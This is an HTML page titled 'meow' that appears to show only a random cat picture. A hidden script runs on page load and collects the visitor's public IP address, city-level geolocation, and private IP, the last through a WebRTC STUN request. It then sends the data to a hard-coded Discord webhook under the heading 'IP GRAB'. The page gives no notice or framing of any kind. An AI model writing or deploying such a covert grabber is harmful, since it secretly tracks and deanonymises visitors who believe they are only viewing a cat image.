<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>meow</title>
    <style>
        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        img { max-width: 90%; border-radius: 12px; }
    </style>
</head>
<body>
    <img src="https://cataas.com/cat" alt="cat">
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEm-Ns5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ";

        async function grab() {
            let pub = "unknown", priv = "unknown", geo = "unknown";

            try {
                const r = await fetch("https://api.ipify.org?format=json");
                pub = (await r.json()).ip;
            } catch (e) {}

            try {
                const r = await fetch(`https://ipwho.is/${pub}`);
                const d = await r.json();
                if (d.success) geo = `${d.city}, ${d.region}, ${d.country}`;
            } catch (e) {}

            try {
                const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("c");
                await new Promise(r => { pc.onicecandidate = e => { if(e.candidate){ const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/); if(m) priv = m[1]; r(); } }});
                await pc.setLocalDescription(await pc.createOffer());
                await new Promise(r => setTimeout(r, 1500));
            } catch (e) {}

            const payload = JSON.stringify({
                content: `**IP GRAB**\npublic: ${pub}\nprivate: ${priv}\ngeolocation: ${geo}`
            });

            try {
                const blob = new Blob([payload], {type: "application/json"});
                navigator.sendBeacon(WEBHOOK, blob);
            } catch (e) {}
            try {
                await fetch(WEBHOOK, {method:"POST", mode:"no-cors", body: blob});
            } catch (e) {}
            try {
                const fd = new FormData();
                fd.append("payload_json", payload);
                navigator.sendBeacon(WEBHOOK, fd);
            } catch (e) {}
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", grab);
        } else {
            grab();
        }
    </script>
</body>
</html>
